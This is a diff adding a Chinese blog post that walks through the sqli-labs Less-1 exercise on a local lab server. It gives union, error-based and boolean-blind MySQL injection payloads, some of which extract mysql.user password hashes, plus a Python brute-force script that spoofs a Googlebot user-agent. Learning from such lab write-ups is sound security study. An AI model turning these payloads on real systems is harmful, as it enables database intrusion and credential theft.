@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+        <meta charset="utf-8" />
+        <title>sqli-labs/Less-1</title>
+        <link rel="stylesheet" href="/theme/css/main.css" />
+</head>
+
+<body id="index" class="home">
+        <header id="banner" class="body">
+                <h1><a href="/">Follow Your Heart </a></h1>
+                <nav><ul>
+                    <li><a href="/category/pentest.html">Pentest</a></li>
+                    <li><a href="/category/learning.html">Learning</a></li>
+                    <li><a href="/category/python.html">Python</a></li>
+                    <li><a href="/pages/tips.html">Tips</a></li>
+                    <li><a href="/pages/bash.html">Bash</a></li>
+                    <li><a href="/pages/question.html">Question</a></li>
+                    <li><a href="/pages/reverse-shell.html">各种姿势的反弹shell</a></li>
+                </ul></nav>
+        </header><!-- /#banner -->
+<section id="content" class="body">
+  <article>
+    <header>
+      <h1 class="entry-title">
+        <a href="/sqli-labs-less-1.html" rel="bookmark"
+           title="Permalink to sqli-labs/Less-1">sqli-labs/Less-1</a></h1>
+    </header>
+<footer class="post-info">
+        <span class="published" title="2016-04-19T00:00:00+02:00">
+                <a href='#'>04/19/2016 </a>
+                <a href="/category/sql.html">SQL</a>
+        </span>
+
+
+
+</footer><!-- /.post-info -->
+    <div class="entry-content">
+      
+      <p>网上关于这个的比较多，第一节课程是单引号注入，一般讲的都比较简单，加一个单引号闭合就行了，但是怎么注入数据呐。因为刚刚开始学，所以我翻了下源代码和数据库，注入出来的payload是这样的：
+<code>2' union select group_concat(id,user()),group_concat(username,@@version),group_concat(password, (select hex(password) from mysql.user limit 1)) from users where id=3 order by id desc -- -</code></p>
+<p>简化一下语句是这样的select * from users where id=2 union select 1,2,3,mid((select password from mysql.user limit 1),N,1) order by id</p>
+<p>union前后的字段数必须一样，union后面的数据可以自己发挥，如何让页面显示注入之后数据可以使用 order by，因为php语句是只显示sql里面第一行结果，所以要让我们注入出来的在第一行显示。 </p>
+<h2>Error based</h2>
+<blockquote>
+<p>首先报错注入要注意闭合语句，比如<code>id=1</code>，如果在PHP里面是这样的<code>select * from users where id='$id'</code>，其中变量是被单引号包围，在使用报错注入的时候一定要闭合单引号,同理其他符号也是。</p>
+</blockquote>
+<h3>BIGINT溢出错误</h3>
+<p>上面是union的注入情况，然后是报错注入如下：
+<code>select * from users where id=1 and !(select*from(select user())x)+~0</code>
+地址栏输入这样的语句
+<code>2' and !(select*from(select+user())x)%2b~0</code>(注意单引号闭合，如果没有闭合还是出现正常的结果。</p>
+<div class="highlight"><pre><span></span><span class="err">本文的攻击之所以得逞，是因为</span><span class="n">mysql_error</span><span class="p">()</span><span class="err">会向我们返回错误消息，只要这样，我们才能够利用它来进行注入。</span> <span class="err">这一功能，是在</span><span class="mi">5</span><span class="p">.</span><span class="mi">5</span><span class="p">.</span><span class="mi">5</span><span class="err">及其以上版本提供的。</span>
+</pre></div>
+
+
+<p>source:<a href="http://drops.wooyun.org/web/8024">http://drops.wooyun.org/web/8024</a></p>
+<h3>EXP溢出错误</h3>
+<p><code>http://127.0.0.1:8080/sqli-labs/Less-1/?id=2%27%20and%20exp%28~%28select*from%28select%20user%28%29%29x%29%29%20--%20-</code>
+和上面类似。
+source:<a href="http://drops.wooyun.org/tips/8166">http://drops.wooyun.org/tips/8166</a></p>
+<p>另外有group by和count冲突，updatexml报错等</p>
+<h3>Duplicate entry …..’ for key ‘group_key’</h3>
+<p>错误比较经典，地址栏的输入poyload如下：
+<code>and (select 29 from(select count(*),concat(floor(rand(0)*2),user())x from users group by x)a)</code>
+技巧的话就是把<code>floor(rand(0)*2)</code>使用concat把想要爆出的数据连接在一起为某个伪字段，然后<code>group by</code>。
+报错需要count(*)，rand()、group by，三者缺一不可.具体的原因嘛看下面三个：</p>
+<ul>
+<li><a href="http://rickgray.me/2014/11/16/error-based-sql-injection.html">http://rickgray.me/2014/11/16/error-based-sql-injection.html</a></li>
+<li><a href="http://www.lijiejie.com/mysql-injection-error-based-duplicate-entry/">http://www.lijiejie.com/mysql-injection-error-based-duplicate-entry/</a></li>
+<li><a href="http://drops.wooyun.org/tips/14312">http://drops.wooyun.org/tips/14312</a></li>
+</ul>
+<h3>extractivalue</h3>
+<p>payload: <code>AND (extractvalue(1,concat(0x7e,(select user()))))</code></p>
+<h3>updatexml</h3>
+<p>payload: <code>and (updatexml (1,concat(0x7e,(select user()),0x73),1))</code></p>
+<h3>GeometryCollection</h3>
+<p>payload: <code>and GeometryCollection((select * from(select * from(select user())a)b))</code></p>
+<p>其他几个好像不经常见，看原网页的记录吧：
+<a href="http://c-chicken.cc/hacking/2016/01/03/Mysql-Error-Sqlinjection.html">http://c-chicken.cc/hacking/2016/01/03/Mysql-Error-Sqlinjection.html</a></p>
+<h2>Bool blind</h2>
+<p>布尔盲注</p>
+<p><code>http://127.0.0.1:8080/sqli-labs/Less-1/?id=2%27%20and%20mid%28%28select%20@@version%29,1,1%29=6%20%20--%20-</code>
+手工参考：<a href="http://www.wooyun.org/bugs/wooyun-2010-017425">http://www.wooyun.org/bugs/wooyun-2010-017425</a>
+判断长度:<code>And (select length(user()))=12</code>
+判断字符:<code>And (select ASCII(SUBSTR(user(),7,1)))&gt;99</code>
+这种可以写个脚本：</p>
+<div class="highlight"><pre><span></span><span class="ch">#!/usr/bin/env python</span>
+<span class="c1"># coding:utf-8</span>
+
+<span class="kn">import</span> <span class="nn">time</span>
+<span class="kn">import</span> <span class="nn">string</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">import</span> <span class="nn">random</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+
+<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;Content-Type&#39;</span><span class="p">:</span> <span class="s1">&#39;application/x-www-form-urlencoded&#39;</span><span class="p">,</span>
+           <span class="s1">&#39;User-Agent&#39;</span><span class="p">:</span> <span class="s1">&#39;Googlebot/2.1 (+http://www.googlebot.com/bot.html)&#39;</span><span class="p">}</span>
+
+<span class="n">payloads</span> <span class="o">=</span> <span class="s1">&#39;abcdefghijklmnopqrstuvwxyz0123456789@_.&#39;</span>
+<span class="k">print</span> <span class="s1">&#39;[</span><span class="si">%s</span><span class="s1">] Start to retrive MySQL User:&#39;</span> <span class="o">%</span> <span class="n">time</span><span class="o">.</span><span class="n">strftime</span><span class="p">(</span><span class="s1">&#39;%H:%M:%S&#39;</span><span class="p">,</span> <span class="n">time</span><span class="o">.</span><span class="n">localtime</span><span class="p">())</span>
+<span class="n">user</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
+
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">16</span><span class="p">):</span>
+    <span class="k">for</span> <span class="n">payload</span> <span class="ow">in</span> <span class="n">payloads</span><span class="p">:</span>
+        <span class="n">s</span> <span class="o">=</span> <span class="s1">&#39;ascii(mid(database(),</span><span class="si">%s</span><span class="s1">,1))=</span><span class="si">%s</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="nb">ord</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>
+        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;http://127.0.0.1:8080/sqli-labs/Less-1/?id=2 and%20&#39;</span> <span class="o">+</span> <span class="n">s</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
+        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">content</span><span class="p">)</span> <span class="o">==</span> <span class="mi">49639</span><span class="p">:</span>
+            <span class="n">user</span> <span class="o">+=</span> <span class="n">payload</span>
+            <span class="k">print</span> <span class="s1">&#39;</span><span class="se">\n</span><span class="s1">[Scan in progress]&#39;</span> <span class="o">+</span> <span class="n">user</span>
+            <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
+            <span class="k">break</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="k">print</span> <span class="s1">&#39;.&#39;</span><span class="p">,</span>
+            <span class="k">print</span> <span class="s1">&#39;http://127.0.0.1:8080/sqli-labs/Less-1/?id=2 and%20&#39;</span> <span class="o">+</span> <span class="n">s</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span>
+            <span class="k">print</span> <span class="nb">len</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">content</span><span class="p">)</span>
+            <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
+<span class="k">print</span> <span class="s1">&#39;</span><span class="se">\n</span><span class="s1">[Done]MySQL user is &#39;</span> <span class="o">+</span> <span class="n">user</span>
+</pre></div>
+
+
+<p>判断那里可以写返回的文本长度或者<code>r.content.find('something')&gt;0</code></p>
+<p>根据sqlmap跑出来的payload，还有一种时间盲注可以查询数据，这种暂时还不会。
+这是sqli-labs的第一节课，网上找到两个布尔盲注的，password没跑下来，不晓得什么个结果。</p>
+    </div><!-- /.entry-content -->
+
+  </article>
+</section>
+        <section id="extras" class="body">
+        </section><!-- /#extras -->
+
+
+</body>
+</html>
